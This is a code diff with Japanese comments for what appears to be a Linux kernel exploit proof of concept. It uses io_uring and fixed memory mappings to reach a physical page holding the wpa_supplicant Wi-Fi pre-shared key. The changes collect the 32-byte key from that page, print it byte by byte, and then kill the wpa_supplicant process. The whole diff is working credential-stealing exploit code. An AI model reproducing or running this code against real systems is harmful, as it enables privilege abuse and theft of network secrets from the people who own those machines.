@@ -8,6 +8,9 @@
 #include <liburing.h>
 #include <stdlib.h>
 
+/* PSK の長さ 256bit = 32byte*/
+const int KEY_LENGTH = 32;
+
 /* dummy page */
 const int DUMMY_PAGE = 199;
 
@@ -21,8 +24,12 @@ const int OFFSET = 0x5000;
 const int PAGE_IN_OFFSET = 0x1f6;
 
 void *mmap_fixed(void *addr);
+void arrange_psk(const uint64_t *psk);
 
 int main() {
+    // psk を 64bit ずつ格納する配列
+    uint64_t psk[KEY_LENGTH / sizeof(uint64_t)];
+
     // 領域を3つ確保
     void *new_map_1 = mmap_fixed((void *)0xdead000000);
     void *new_map_2 = mmap_fixed((void *)0xdead200000);
@@ -140,14 +147,21 @@ int main() {
     if (target_page.phys_addr == phys_addr) {
         printf("[+] successfully lead to the target page\n");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
-        for (int i = 0; i < 4; i++) {
-            printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
+        for (int i = 0; i < (KEY_LENGTH / sizeof(uint64_t)); i++) {
+            psk[i] = *(uint64_t *)(psk_addr + i * sizeof(uint64_t));
+            // printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
         }
+        arrange_psk(psk);
     } else {
         printf("[-] failed to lead to the target page\n");
     }
 
-    if (munmap(new_map_1, 0x1000) == -1) perror("[-] munmap() failed");
+    // 後処理
+    kill_wpa_supplicant();
+    munmap(new_map_1, 0x1000);
+    munmap(new_map_2, 0x1000);
+    munmap(pbuf_map, 0x1000);
+    io_uring_queue_exit(&ring);
 
     return 0;
 }
@@ -166,4 +180,17 @@ void *mmap_fixed(void *addr) {
         exit(1);
     }
     return new_mem;
+}
+
+void arrange_psk(const uint64_t *psk) {
+    printf("========== PSK ==========\n");
+    uint64_t value;
+    for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
+        value = psk[i];
+        while (value > 0) {
+            printf("%02lx ", value % 0x100);
+            value /= 0x100;
+        }
+    }
+    printf("\n");
 }
